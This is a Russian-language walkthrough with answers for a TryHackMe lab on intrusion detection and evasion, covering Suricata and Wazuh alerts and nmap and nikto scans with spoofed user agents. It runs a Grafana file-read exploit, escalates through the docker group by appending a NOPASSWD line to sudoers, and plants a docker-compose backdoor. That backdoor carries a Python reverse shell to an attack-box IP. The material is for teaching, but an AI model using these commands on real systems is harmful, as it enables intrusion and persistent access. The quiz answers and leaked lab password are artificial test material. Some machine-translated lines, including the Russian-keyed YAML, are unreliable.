[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Intrusion Detection](https://tryhackme.com/r/room/idsevasion) 

Всего 12 заданий:
## Задание 1
Вы когда-нибудь проходили CTF и задавались вопросом: «А меня бы обнаружили?». Эта комната послужит введением в мир 
систем обнаружения вторжений (IDS) и методов киберуклонения. Чтобы пройти эту комнату, вам нужно будет 
организовать полный захват системы, экспериментируя с методами уклонения на всех этапах цепочки киберуничтожения.

В этой комнате также демонстрируется первый публичный тест новой системы оценки CTF, разработанной для добавления 
дополнительной интерактивности, обратной связи и возможности повторного воспроизведения в CTF. Короче говоря, эту 
систему и несколько IDS с открытым исходным кодом можно объединить для предоставления разбивки по пользователям и 
оценки всех оповещений IDS, созданных в ходе CTF.

Доступ к системе можно получить, перейдя по адресу  http://MACHINE_IP:8000/register . 

ПРИМЕЧАНИЕ: Эта комната может занять до пяти минут, чтобы стать полностью доступной, поэтому вы не сможете 
зарегистрироваться немедленно. Однако вы можете выполнить первые несколько заданий без полного доступа к системе. 
Также убедитесь, что вы зарегистрировали учетную запись, прежде чем проводить какие-либо атаки.

### Ответьте на вопросы ниже
Разверните целевую машину, создайте учетную запись и войдите в систему по адресу http://MACHINE_IP:8000, чтобы 
подготовиться к будущим задачам. 
```commandline
Ответ не нужен
```

## Задание 2
Системы обнаружения вторжений (IDS) — это инструмент, который обычно используется для защиты сетей путем 
автоматизации обнаружения подозрительной активности. В то время как брандмауэр, антивирус или система авторизации 
могут предотвратить возникновение определенной активности на или против ИТ-активов, IDS вместо этого будет 
отслеживать активность, которая не ограничена, и сортировать вредоносное от безвредного. IDS обычно применяют одну 
из двух различных методологий обнаружения: IDS на основе сигнатур (или правил) будет применять большой набор правил 
для поиска подозрительной активности в одном или нескольких источниках данных, тогда как IDS на основе аномалий 
устанавливает, что считается нормальной активностью, а затем выдает оповещения при обнаружении активности, которая 
не соответствует базовому уровню.

В любом случае, как только инцидент будет обнаружен, IDS сгенерирует оповещение и затем перешлет его дальше по 
цепочке безопасности на платформы агрегации журналов или визуализации данных, такие как Graylog или ELK Stack. 
Некоторые IDS также могут иметь некоторую форму технологии предотвращения вторжений и могут автоматически 
реагировать на инцидент.

К этой демонстрации прикреплены две сигнатурные IDS: Suricata, сетевая IDS (NIDS), и Wazuh, хостовая IDS (HIDS). 
Обе эти IDS реализуют одну и ту же всеобъемлющую методологию обнаружения сигнатур; однако их общее поведение и типы 
атак, которые они могут обнаружить, сильно различаются. Мы рассмотрим точные различия более подробно в следующих 
задачах.

### Ответьте на вопросы ниже
Какая методология обнаружения IDS основана на наборах правил?
```commandline
signature-based detection
```

## Задание 3
Как следует из названия, системы обнаружения сетевых вторжений (NIDS) отслеживают сети на предмет вредоносной 
активности, проверяя пакеты на наличие следов активности, связанной с широким спектром враждебной или нежелательной 
активности, включая:

- Управление и контроль вредоносного ПО
- Инструменты для эксплуатации
- Сканирование
- Утечка данных
- Контакты с фишинговыми сайтами
- Нарушения корпоративной политики

Сетевое обнаружение позволяет одной установке контролировать всю сеть, что делает развертывание NIDS более простым, 
  чем у других типов. Однако NIDS более склонны к генерации ложных срабатываний, чем другие IDS , это отчасти 
  связано с огромным объемом трафика, проходящего даже через небольшую сеть, и сложностью создания набора правил, 
  который был бы достаточно гибким для надежного обнаружения вредоносного трафика без обнаружения безопасных 
  приложений, которые могут оставлять похожие следы. Это можно несколько облегчить, настроив IDS на применение 
  только тех правил, которые будут считаться ненормальным трафиком для любой конкретной сети, однако это займет 
  некоторое время, поскольку IDS должна быть развернута в сети в течение некоторого времени, чтобы установить, какой 
  трафик является нормальным.

NIDS могут быть развернуты по обе стороны брандмауэра, однако, как правило, они развертываются на стороне локальной 
сети, поскольку существует ограниченная ценность в обнаружении атак, которые происходят против внешних узлов, 
поскольку они будут постоянно подвергаться атакам. NIDS также может иметь некоторую форму функциональности 
предотвращения вторжений (IPS) и иметь возможность блокировать узлы, которые вызывают заданное количество оповещений,
это не всегда включено, поскольку автоматическая блокировка может конфликтовать с высоким уровнем ложных 
срабатываний. Обратите внимание, что NIDS полагаются на доступ ко всем коммуникациям между узлами и, таким образом, 
страдают от повсеместного внедрения шифрования при передаче.

Существует множество открытых и фирменных NIDS, узел в этом сценарии защищен открытым исходным кодом NIDS, Suricata. 
Для этого демо режим IPS отключен, так что вы можете свободно проводить столько атак, сколько захотите. Фактически, 
попробуйте запустить некоторые из ваших любимых инструментов против цели и посмотрите, как отреагируют различные IDS 
. История всех оповещений, сгенерированных в этой комнате, доступна по адресу http://MACHINE_IP:8000/alerts

### Ответьте на вопросы ниже
Какой широко используемый протокол отрицательно влияет на надежность NIDS?
```commandline
TLS
```
Поэкспериментируйте, запустив инструменты против цели и просматривая полученные оповещения. Есть ли какая-либо 
неожиданная активность? 
```commandline
Ответ не нужен
```

## Задание 4
Теперь, когда основы NIDS были рассмотрены, пришло время обсудить некоторые простые методы уклонения в контексте 
первого этапа кибер-цепочки убийств, разведки. Сначала выполните следующую команду против цели на MACHINE_IP

`nmap -sV MACHINE_IP`

Я рекомендую завершить эту комнату, если вы не знакомы с nmap. Проще говоря, указанная выше команда извлечет 
подробный список служб, подключенных к целевому узлу, выполнив ряд предопределенных действий против цели. Например, 
nmapзапросит длинные пути от HTTP- серверов, чтобы намеренно создать ошибки 404, некоторые HTTP- серверы предоставят 
дополнительную информацию при возникновении ошибки 404.

Приведенная выше команда не использует никаких методов уклонения, и в результате большинство NIDS должны быть в 
состоянии обнаружить ее без проблем, на самом деле, вы должны быть в состоянии проверить это сейчас, перейдя на 
MACHINE_IP:8000/alerts. Suricata должна была обнаружить, что некоторые пакеты содержат nmapпользовательский агент по 
умолчанию, и вызвать оповещение. Suricata также обнаружила необычные HTTP- запросы, которые nmapзаставляют вызывать 
ответы от приложений, предназначенных для управления версиями служб. Wazuh также мог обнаружить коды ошибок 400, 
сделанные в ходе сканирования.

Мы можем использовать эту информацию для проверки нашей первой стратегии уклонения. Добавив следующее для изменения 
user_agent http.useragent=<AGENT_HERE>, мы можем установить user agent используемый nmapна новое значение и частично 
уклониться от обнаружения. Попробуйте запустить команду сейчас, большой список user agent доступен здесь . 
Окончательная команда должна выглядеть примерно так:

`nmap -sV --script-args http.useragent="<USER AGENT HERE>" MACHINE_IP`

Обратите внимание, что эта стратегия не идеальна, поскольку и Suricata, и Wazuh более чем способны обнаружить 
активность с помощью агрессивных сканирований. Попробуйте выполнить следующую nmap команду с новым User-Agent: 

`nmap --script=vuln --script-args http.useragent="<USER AGENT HERE>" MACHINE_IP`

Приведенная выше команда указывает nmap использовать скрипты обнаружения уязвимостей против цели, которые могут 
возвращать массу информации. Однако, как вы могли заметить, они также генерируют значительное количество оповещений 
IDS, даже если указан другой User-Agent в качестве nmap зондов для большого количества потенциальных векторов атак. 
Также возможно обойти обнаружение, используя SYN (-sS)режим сканирования «скрыто»; однако это возвращает гораздо 
меньше информации, поскольку не выполняет никакого обнаружения служб или версий, попробуйте запустить это сейчас:

`nmap -sS MACHINE_IP`

Это важный момент, поскольку, как правило, чем больше вы уклоняетесь от IDS, тем меньше информации вы сможете 
получить. Хороший некибераналог можно найти в морской войне с использованием активного и пассивного сонара. Если бы 
вы управляли подводной лодкой и использовали активный сонар для поиска кораблей, вы бы могли получить много 
информации о своих противниках, однако вы также позволили бы своему противнику обнаружить вас так же легко, как он 
мог бы обнаружить ваши активные сканирования.

Также важно учитывать положение цели по отношению к сети при выполнении разведки. Если целевой актив находится в 
открытом доступе, то, возможно, не нужно выполнять какие-либо уклонения, поскольку весьма вероятно, что актив также 
подвергается атаке бесчисленного количества ботнетов и сканирований по всему интернету, и, таким образом, активность 
может быть скрыта под другими атаками. С другой стороны, публично открытые активы также могут быть защищены 
инструментами ограничения скорости, такими как fail2ban. Сканирование сайта, который находится под защитой такого 
инструмента, скорее всего, приведет к тому, что ваш IP будет очень быстро заблокирован.

И наоборот, если вы сканируете важную базу данных за корпоративным брандмауэром, к которой никогда не должен быть 
доступ извне, одно оповещение IDS, скорее всего, станет причиной некоторой тревоги. Обратите внимание, что система 
подсчета очков учитывает это, поэтому результаты, которые вы видите для атак на целевой веб-сервер, будут меньше по 
сравнению с активами, которые будут атакованы позже в этой комнате (система подсчета очков работает примерно как 
Golf, поэтому чем выше оценка, тем хуже).

Мы также должны рассмотреть точное определение уклонения применительно к IDS ; оно может быть полным, когда 
оповещения IDS не срабатывают в результате враждебных действий, или частичным, когда оповещение срабатывает, но его 
серьезность снижается. В некоторых сценариях полное уклонение может быть единственным вариантом, например, если 
вовлечены ценные активы. В других случаях частичное уклонение может быть таким же хорошим, как и оповещения IDS 
низкой серьезности , особенно от NIDS, которые с гораздо меньшей вероятностью будут расследованы или даже переданы 
дальше по цепочке управления оповещениями. Опять же, это отражается в системе подсчета очков, поскольку она будет 
учитывать надежность каждой из прикрепленных IDS при подсчете очков.

### Ответьте на вопросы ниже
Какая шкала используется для измерения серьезности тревоги в Suricata? (*-*)
```commandline
1-3
```
Сколько служб nmap может полностью распознать при выполнении сканирования служб (-sV)?
```commandline
3
```

## Задание 5
Конечно, nmap это не единственный инструмент, который имеет инструменты обхода IDS. Например, веб-сканер niktoтакже 
имеет ряд опций, с которыми мы поэкспериментируем в рамках этой задачи, где мы выполняем более агрессивные 
сканирования для перечисления уже обнаруженных нами служб. В целом, nikto это гораздо более агрессивный сканер, чем 
nmap и, таким образом, его сложнее скрыть; однако эти более агрессивные сканирования могут вернуть больше полезной 
информации в некоторых случаях. Давайте начнем с запуска nikto с минимальными опциями:

`nikto -p 80,3000 -h MACHINE_IP`

Обратите внимание, что нам нужно указать, что мы хотим сканировать обе веб-службы, присутствующие на устройстве, а 
не только бизнес-сайт. Это должно вернуть некоторую полезную информацию, но также сгенерировать огромное количество 
оповещений, в общей сложности 7000. Давайте рассмотрим несколько простых вариантов, чтобы уменьшить это. Первым 
шагом, вероятно, будет полное прекращение сканирования бизнес-сайта, осмотреться, видите ли вы какие-либо 
доказательства интерактивных элементов или структуры веб-приложения? Статические сайты сами по себе не создают много 
уязвимостей, поэтому, вероятно, лучше считать этот вектор атаки закрытым на данный момент. Помните,  nikto это чистый 
веб-сканер, и он не будет искать другие службы для векторов субъектов. Мы можем обновить команду следующим образом:

`nikto -p 3000 -h MACHINE_IP`

Далее, мы должны рассмотреть, что nikto будет искать все возможные категории уязвимостей по умолчанию. Обычно это не 
нужно в реальном мире или в CTF, где такие опции, как атаки типа «отказ в обслуживании» не так уж полезны или даже 
контрпродуктивны, давайте обновим команду, чтобы отразить это, в этом случае я попросил nikto проверить только: 
интересные файлы, неправильную конфигурацию и раскрытие информации. Полный список параметров настройки доступен на 
экране справки (-H), я рекомендую вам поэкспериментировать с различными комбинациями и записать полученную информацию.

`nikto -p 3000 -T 1 2 3 -h MACHINE_IP`

Вы также должны заметить, что сканирование было выполнено намного быстрее, чем предыдущие сканирования, имейте это в 
виду для будущих CTF, есть преимущества в выполнении дополнительной работы по настройке, помимо сохранения низкого 
профиля. Наконец, мы должны рассмотреть варианты уклонения, доступные с nikto. Во-первых, давайте убедимся, что 
используется более подходящий User-Agent, поскольку, опять же, по умолчанию он не предназначен для скрытности, вы 
обнаружите, что это общая тема для многих различных сканеров:

`nikto -p3000 -T 1 2 3 -useragent <AGENT_HERE> -h MACHINE_IP`

Это должно сделать сканирование немного более тонким. Теоретически, мы могли бы пойти дальше и использовать выбор 
доступных режимов обхода IDSnikto , которые устанавливаются с помощью -e флага:

`nikto -p3000 -T 1 2 3 -useragent <AGENT_HERE> -e 1 7 -h MACHINE_IP`

В этом случае я установил два варианта обхода: случайное кодирование URL и случайный регистр URL, попробуйте 
запустить сканирование сейчас. После завершения сканирования вы должны увидеть, что количество оповещений IDS, 
сгенерированных сканированием, фактически увеличилось после добавления флагов методов обхода. Современные NIDS, 
такие как Suricata, также способны обнаруживать необычные данные в пакетах, такие как неожиданные символы и 
недопустимые заголовки, и поэтому, активировав методы обхода, мы увеличили обнаруживаемость нашего сканирования, 
поскольку теперь оно также включает сломанные заголовки HTTP, а также известные эксплойты.

Существуют также более сложные варианты уклонения, выходящие за рамки умного использования определенных функций 
веб-сканера; однако многие из этих вариантов требуют дополнительных ресурсов, которые могут быть просто недоступны в 
среде CTF или за ее пределами. Например, если бы вы каким-то образом получили доступ к достаточно большой 
ботнет-сети, можно было бы просто перегрузить целевую IDS или операторов IDS, завалив систему оповещениями от многих 
хостов и векторов атак и таким образом скрыть настоящую атаку. Эта стратегия также может просто привести к сбою 
любой IDS, защищающей службу, если отправлено достаточно пакетов, хотя большинство IDS используют какую-либо форму 
ограничителя пропускной способности. Фактически, я настроил ограничитель в Wazuh для максимально быстрого вывода для 
этого CTF, в противном случае обработка всех оповещений, генерируемых агрессивным сканированием, заняла бы слишком 
много времени.

Также могут быть доступны более практичные варианты из области разведки с открытым исходным кодом, которые будут 
рассмотрены в следующей задаче.

### Ответьте на вопросы ниже
Никто, при первом сканировании должен обнаружиться интересный путь, как он называется?
```commandline
/login
```
Какое значение используется для переключения векторов отказа в обслуживании при использовании настройки сканирования 
(-T) в nikto?
```commandline
6
```
Какие флаги используются для изменения интервала запроса в nikto? Используйте запятые для разделения флагов в вашем 
ответе.
```commandline
6,A,B
```

## Задание 6
Продолжая аналогию с гидролокатором, приведенную ранее, если nmap сканеры и другие сканеры являются активными 
гидролокаторами, то разведка с открытым исходным кодом или OSINT является пассивным гидролокатором, поскольку 
разведданные собираются не с помощью активных зондов, а путем «прослушивания» информации, которую цель свободно 
распространяет, или путем получения информации от источников, недовольных целью.

Большинство форм OSINT не поддаются обнаружению по аффективности и, таким образом, чрезвычайно эффективны против IDS,
однако существуют ограничения, поскольку по своей природе OSINT полагается на цель для раскрытия информации, что 
может не произойти, если цель не является общедоступной или разработана для уменьшения раскрытия данных. Хорошим 
примером этого является протокол Wireguard VPN, который не будет отвечать на запросы, если они не исходят от 
аутентифицированного источника, что делает его невидимым для сторонних сайтов сканирования, таких как shodan.

Что касается информации, которую можно получить от третьих лиц, в качестве отправной точки могут быть доступны 
следующие источники:

- Информацию об активных на узле службах можно получить с помощью таких инструментов, как Shodan.
- Дополнительные ресурсы можно найти с помощью поисковых систем и расширенных тегов, таких как :site, :filetype или 
  :title.
- Поддомены и связанные с ними IP-адреса можно найти с помощью онлайн-сканеров или таких инструментов, как recon-ng; 
  неудачно выбранный поддомен также может раскрыть информацию о цели, даже если она защищена брандмауэром.
- Запросы ASN и WHOIS могут выявить, какой провайдер отвечает за хостинг сайта.


Информация также может быть собрана с целевого сайта и связанных с ним активов, если они общедоступны, включая:

- Технологии, используемые для хостинга сайта, могут быть получены из страниц ошибок, расширений файлов, страниц 
отладки или тега сервера, используемого в HTTP- ответе.
- Дополнительная информация об инструментах, используемых целевой аудиторией, может быть доступна в списках вакансий.
- Для этой демонстрации ознакомьтесь с «публичным» сайтом и посмотрите, сколько информации вы можете получить.

### Ответьте на вопросы ниже
Какая версия Grafana установлена на сервере?
```commandline
8.2.5
```
Каков идентификатор серьезной CVE, которая затрагивает эту версию Grafana?

```commandline
CVE-2021-43798
```
Если бы этот сервер был общедоступным, на каком сайте уже могла бы быть информация о его услугах?
```commandline
shodan
```
Как бы мы искали файлы PDF на сайте «example.com», используя расширенные теги поиска Google?
```commandline
site:example.com filetype:pdf
```

## Задание 7
Любая сигнатурная система обнаружения атак в конечном итоге зависит от качества ее набора правил; сигнатуры атак 
должны быть четко определены, протестированы и последовательно применяться, в противном случае атака, скорее всего, 
останется незамеченной. Также важно, чтобы набор правил поддерживался в актуальном состоянии, чтобы сократить время 
между обнаружением нового эксплойта и загрузкой его сигнатур в развернутую систему обнаружения атак. Разработка 
набора правил сложна, и все наборы правил, особенно те, которые развернуты в NIDS, никогда не будут полностью 
точными. Неточные наборы правил могут генерировать ложные срабатывания или ложные срабатывания, причем оба сбоя 
влияют на безопасность активов, находящихся под защитой системы обнаружения атак.

В этом случае мы определили, что один из целевых активов затронут критической уязвимостью, которая позволит нам 
выполнить аутентификацию by-parse и получить доступ на чтение практически к любому файлу в системе. Прошло некоторое 
время с тех пор, как эта уязвимость была опубликована, поэтому ее сигнатура доступна в наборе правил Emerging 
Threats Open, который загружается по умолчанию в Suricata. Давайте запустим этот эксплойт и посмотрим, обнаружены ли 
мы; Сначала возьмите скрипт для запуска этого эксплойта с GitHub:

`wget https://raw.githubusercontent.com/Jroo1053/GrafanaDirInclusion/master/src/exploit.py`

После завершения загрузки скрипта вы можете запустить его с помощью:

`python3 exploit.py -u MACHINE_IP -p 3000 -f <REMOTE FILE TO READ>`

Посмотрите, что вы можете найти на сервере, помните, что эксплойт дает нам доступ к тем же привилегиям пользователя, 
который запускает службу. Как только вы будете довольны тем, что вы нашли на сервере, посмотрите историю оповещений 
IDS на MACHINE_IP:8000/alerts. Видите ли вы какие-либо доказательства того, что этот конкретный эксплойт был 
обнаружен? как я уже сказал, не все наборы правил идеальны.

### Ответьте на вопросы ниже
Какой пароль у учетной записи grafana-admin?

```commandline
GraphingTheWorld32
```
Возможно ли получить прямой доступ к серверу теперь, когда известен пароль grafana-admin? (да/нет)


```commandline
yay
```
Могут ли какие-либо из подключенных IDS обнаружить атаку, если файл /etc/shadow запрашивается через эксплойт, и если 
да, то какие IDS ее обнаружили?

```commandline
Suricata
```

## Задание 8
Не все формы вредоносной активности включают сетевой трафик, который может быть обнаружен NIDS, например, 
вирус-вымогатель может быть нарушен через внешнего поставщика услуг электронной почты, установленного и запущенного 
на целевой машине, и, будучи обнаруженным NIDS только один раз, он звонит домой с сообщениями о своем успехе, что, 
конечно, слишком поздно. По этой причине часто рекомендуется развернуть хостовую IDS вместе с NIDS для проверки 
подозрительной активности, которая происходит на устройствах, а не только в сети, включая:

- Выполнение вредоносного ПО
- Изменения конфигурации системы
- Ошибки программного обеспечения
- Изменения целостности файлов
- Повышение привилегий


Развертывание HIDS может быть намного сложнее, чем NIDS, поскольку они часто требуют установки и управления агентом 
  на каждом хосте, который должен быть охвачен HIDS. Этот агент обычно пересылает активность из источников данных в 
  системе в центральный узел управления и обработки, который затем применяет правила к пересылаемым данным способом, 
  аналогичным любой другой IDS. Эти источники данных обычно включают:

- Файлы журналов приложений и системы
- Реестр Windows
- Показатели производительности системы
- Состояние самой файловой системы
Это может быть трудно сделать в большой среде без какой-либо формы автоматизированного механизма развертывания, 
  например Ansible. Также часто необходимо выполнить дополнительную работу по настройке при первом развертывании 
  HIDS, поскольку параметры по умолчанию, скорее всего, пропустят определенные приложения. Например, для создания 
  этого демонстрационного развертывания я создал пользовательские образы Docker для каждой службы, которая 
  отслеживалась HIDS, и настроил агента на чтение из каждого файла журнала служб, выполняя это для каждой 
  контейнеризованной службы в реальной сети, и управление обновлениями быстро вышло бы из-под контроля, если бы не 
  была развернута автоматизация.

Основное различие между HIDS и NIDS заключается в типах активности, которые они могут обнаружить. HIDS обычно не 
имеет доступа к журналу сетевого трафика и, следовательно, не может обнаружить определенные формы активности вообще 
или может обнаружить только более агрессивную активность. Мы можем продемонстрировать это сейчас, выполнив следующую 
команду и записав, какую активность обнаруживает IDS, помня, что Wazuh и Suricata оба подключены к цели:
`nmap -sV MACHINE_IP`

Wazuh должен быть в состоянии обнаружить, что была предпринята попытка небезопасного SSH-подключения к серверу, но 
не будет упоминать о подключении к HTTP- серверу, в отличие от Suricata. Однако, если мы запустим: 

nmap --script=vuln MACHINE_IP

Wazuh создаст тысячи оповещений, поскольку он обнаружит каждый код ошибки 400, созданный в результате запуска 
скрипта уязвимости, поскольку эта атака создает записи в журнале ошибок, который является одним из источников, из 
которых Wazuh считывает информацию, если он также был настроен.

### Ответьте на вопросы ниже
К какой категории Wazuh относит коды ошибок HTTP 400?
```commandline
web
```
Поэкспериментируйте с некоторыми инструментами и командами для постэксплуатации и обратите внимание на активность, 
обнаруженную Wazuh; сравните ее с активностью, обнаруженной Suricata. 
```commandline
Ответ не нужен
```

## Задание 9
Теперь, когда начальная точка опоры установлена, пришло время обсудить, как IDS может отслеживать повышение 
привилегий. Это в первую очередь задача для HIDS, поскольку многие задачи после эксплуатации, такие как повышение 
привилегий, не требуют связи с внешним миром и их трудно или невозможно обнаружить с помощью NIDS. Фактически, 
повышение привилегий — это наша первая задача, поскольку мы еще не являемся root. Первым шагом в повышении 
привилегий обычно является проверка того, какие разрешения у нас есть в данный момент, это может сэкономить нам 
много работы, если мы уже в группе sudo. Есть несколько разных способов проверить это, включая:

- `sudo -l` это вернет список всех команд, которые учетная запись может выполнять с повышенными правами доступа через 
sudo
- `groups` выведет список всех групп, в которые входит текущий пользователь.
- `cat /etc/group` должен вернуть список всех групп в системе и их участников. Это может помочь в поиске пользователей 
  с более высокими привилегиями доступа, а не только наших собственных.
Запустите все эти команды и отметьте, какие из них создают оповещение IDS, Suricata будет слепа ко всему этому, 
  поскольку ни одна из этих команд не создает сетевую активность. Также можно проверить это и многое другое с 
  помощью скрипта, например linPEAS , до сих пор каждый раз, когда мы использовали скрипт, он, как правило, был 
  источником большей информации, но и увеличения количества оповещений. Однако это не всегда так. Запустите  
  linpeas сейчас в системе и отметьте, сколько оповещений создается по отношению к большому объему разведывательной 
  работы, которую он выполняет.

Конечно, эта активность не полностью невидима, поскольку, linpeas скорее всего, будет обнаружена антивирусом, если 
он установлен, хотя есть способы уменьшить его след. Существует также вопрос транспортировки скрипта в целевую 
систему, Suricata способна определять, когда скрипты загружаются через wget, однако TLS ограничивает ее 
способность фактически определять трафик без развертывания веб-прокси-серверов. Также может быть возможно просто 
скопировать и вставить содержимое скрипта, однако большинство HIDS реализуют некоторую форму мониторинга целостности 
файловой системы, которая обнаружит добавление скрипта, даже если антивирус не установлен, подробнее об этом позже.

В любом случае, linpeas необходимо иметь возможность определить потенциальный вектор эскалации привилегий.

### Ответьте на вопросы ниже
Какой инструмент linPEAS определяет как имеющий потенциальный вектор эскалации?
```commandline
docker
```
Выдает ли Wazuh оповещение при добавлении linPEAS в систему? Если да, то какова его серьезность?
```commandline
5
```

## Задание 10
Последняя задача позволила нам идентифицировать Docker как потенциальный вектор повышения привилегий. Теперь пришло 
время выполнить само повышение привилегий. Однако сначала я должен объяснить, как работает это конкретное повышение 
привилегий. Короче говоря, эта атака использует часто предлагаемый обходной путь, который позволяет пользователям 
без прав root запускать контейнеры docker. Обходной путь требует добавления непривилегированного пользователя в 
docker группу, что позволяет этому пользователю запускать контейнеры без использования sudo или наличия прав root. 
Однако это также предоставляет эффективные привилегии уровня root указанному пользователю, поскольку он может 
создавать контейнеры без ограничений.

Мы можем использовать эти возможности для получения прав root довольно легко, попробовав выполнить следующее с 
grafana-admin учетной записью:

`docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master`

Это создаст контейнер в интерактивном режиме, перезапишет точку входа по умолчанию, чтобы предоставить нам оболочку, 
и смонтирует файловую систему хостов в root. Из этого контейнера мы можем затем отредактировать один из следующих 
файлов, чтобы получить повышенные привилегии:

- `/etc/group` Мы могли бы добавить grafana-adminучетную запись в корневую группу. Обратите внимание, что этот файл 
находится под защитой HIDS
- `/etc/sudoers` Редактирование этого файла позволит нам добавить учетную запись grafana-admin в список sudoers и, 
  таким образом, мы сможем запустить, sudo чтобы получить дополнительные привилегии. Опять же, этот файл отслеживается Wazuh.
- В этом случае мы можем выполнить это, запустив:
`echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers`

Мы могли бы добавить нового пользователя в систему и присоединиться к корневой группе через `/etc/passwd`. Опять же, 
эта активность, вероятно, будет замечена HIDS
Попробуйте несколько из этих вариантов и обратите внимание на полученные оповещения IDS.

### Ответьте на вопросы ниже
Выполните повышение привилегий и получите флаг в /root/
```commandline
{SNEAK_ATTACK_CRITICAL}
```
## Задание 11
Скомпрометированный хост работает под управлением Linux, поэтому у нас есть ряд механизмов сохранения, доступных нам.
Первый вариант, который, возможно, является самым простым, заключается в добавлении открытого ключа, который мы 
контролируем, в файл authorized_keys в /root/.ssh/. Это позволило бы нам подключаться к хосту через SSH без 
необходимости запускать эксплойт повышения привилегий каждый раз и не полагаясь на то, что пароль для 
скомпрометированной учетной записи не изменится. Эта методология очень распространена среди ботнетов, поскольку она 
и надежна, и очень проста в реализации, поскольку практически все дистрибутивы Linux, предназначенные для 
использования на сервере, по умолчанию запускают службу Open- SSH.

Попробуйте это сейчас, допустимую пару ключей можно сгенерировать для атакующего блока, запустив ssh-keygen. После 
добавления этого ключа в файл authorized_keys  /root/.ssh/вы сможете получить удаленный доступ к root, когда это 
необходимо, просто, не так ли? Что ж, к сожалению, у этой тактики есть один большой недостаток, поскольку она легко 
обнаруживается.

HIDS часто имеют некоторую форму службы мониторинга целостности файловой системы, которая периодически сканирует 
список целевых каталогов на предмет изменений, и каждый раз при изменении или добавлении файла выдается 
предупреждение. Добавляя запись в authorized_keysфайл, вы бы вызвали предупреждение довольно высокой степени 
серьезности, и в результате это может быть не лучшим вариантом. Предупреждение также выдается каждый раз при 
установлении соединения ssh, поэтому оператор HIDS будет уведомлен каждый раз, когда мы входим в систему.

Было бы очень полезно проверить, как настроена IDS, прежде чем мы продолжим, поскольку это может помочь нам с 
поиском векторов, которые не отслеживаются. Wazuh имеет два режима конфигурации, локальный и централизованный в этом 
случае, агенты HIDS настраиваются локально, а файл конфигурации можно найти по адресу /var/ossec/etc/ossec.conf . В 
этом файле перечислены все источники данных, которые покрываются HIDS в этом случае, включены следующие:

- Мониторинг файловой системы . Как уже упоминалось, это влияет на нашу возможность просто установить ключи SSH, но 
это также влияет на другие векторы устойчивости, такие как, cronи systemdлюбые атаки, требующие установки дополнительных инструментов.
- Сбор системного журнала . Эта функция будет генерировать оповещения, когда в системе будут предприняты некоторые 
  действия после эксплуатации, такие как создание SSH -подключений и попытки входа в систему.
- Инвентаризация системы - отслеживает системные метрики, такие как открытые порты, сетевые интерфейсы, пакеты и 
  процессы. Это влияет на нашу способность открывать новые порты для обратных оболочек и устанавливать новые пакеты. 
  Обратите внимание, что эта функция в настоящее время не генерирует оповещения сама по себе и требует, чтобы 
  оператор HIDS написал свои собственные правила. Однако отчет будет доступен на платформе анализа журналов 
  восходящего потока, такой как Kibana

Обратите внимание, что мониторинг Docker также доступен, однако в данном случае он не включен, что дает нам несколько вариантов:

- Мы могли бы перехватить существующую цепочку поставок контейнеров и использовать ее для установки бэкдора в один из 
контейнеров, размещенных в системе. Это было бы трудно обнаружить без дополнительных технологий мониторинга и 
  сканирования контейнеров. Учетные данные для реестра Docker могли бы быть либо подменены, либо извлечены из /root/.
  docker/config.json , поскольку это место хранит учетные данные, используемые с командой, в виде открытого текста . 
  Однако в данном случае это не сработает, поскольку хост, который мы скомпрометировали, не имеет доступа в Интернет,
  а учетные данные отсутствуют в .docker login /root/.docker/config.json
- Мы могли бы изменить существующую настройку docker-compose, включив привилегированный контейнер с поддержкой SSH, и 
  смонтировать файловую систему хоста в нее с помощью -v /:/hostOS. Файл docker-compose, используемый для 
  определения текущей настройки, не отслеживается монитором целостности файловой системы, как в Опять же /var/lib., 
  в данном случае это не сработает, поскольку у нас нет доступа к Интернету, хотя вы могли бы перенести образы 
  контейнеров из атакующего блока на скомпрометированную виртуальную машину через SSH . Вам также нужно будет 
  открыть новый порт для соединения ssh, который будет отображаться в отчете об инвентаризации системы.
- Мы могли бы изменить существующую или новую настройку docker-compose, злоупотребляя entrypoint опцией предоставления 
  нам обратной оболочки. Использование docker-compose также позволяет нам указывать автоматические перезапуски, что 
  повышает устойчивость бэкдора. Эта опция также меняет на противоположную типичную модель клиент-серверного 
  соединения, поэтому нам не нужно будет открывать новые порты на хосте.
Для реализации последнего варианта добавьте в новый файл docker-compose следующее:

`---
версия : "2.1"
услуги :
  бэкдорсервис :
    перезапуск : всегда
    изображение : ghcr.io/jroo1053/ctfscore:master
    точка входа : > 
       python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
       s.connect(("<ATTACKBOXIP>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno() ,2);
       pty.spawn("/bin/sh")'
    тома :
      - /:/мнт
    привилегированный : правда`


Это создаст новый контейнер docker, используя образ, который уже доступен в системе, смонтирует всю файловую систему 
хоста в /mnt/контейнер и создаст обратную оболочку с python. Прослушайте соединение обратной оболочки на атакующем 
блоке с помощью:

`nc -lvnp 4242`

Затем запустите службу на хосте с помощью:

`docker-compose up`

После выполнения этих действий у вас должен быть способ доступа к уязвимому хосту без использования SSH, уязвимой 
службы или учетных данных пользователя. Конечно, вы по-прежнему сможете использовать эти другие методы в сочетании с 
docker-compose reverse shell в качестве резервных копий.

### Ответьте на вопросы ниже
Использовать Docker для создания бэкдора на хост-системе

```commandline
Ответ не нужен
```

## Задание 12
Надеюсь, вам понравилась эта комната и вы узнали несколько вещей. Как уже упоминалось, эта комната была первым 
публичным тестом проекта системы подсчета очков CTF, который я разрабатывал. Я приложил ссылку на исходный код 
системы подсчета очков. Она лицензирована по AGPL-3.0, поэтому вы можете свободно изменять ее или добавлять систему 
в свой собственный CTF. В репозитории есть документация по установке и настройке, а также ссылки на готовые образы 
docker.

Ссылка на репозиторий: https://github.com/Jroo1053/CTFScore

Спасибо за игру.

### Ответьте на вопросы ниже
Прочитайте выше
```commandline
Ответ не нужен
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)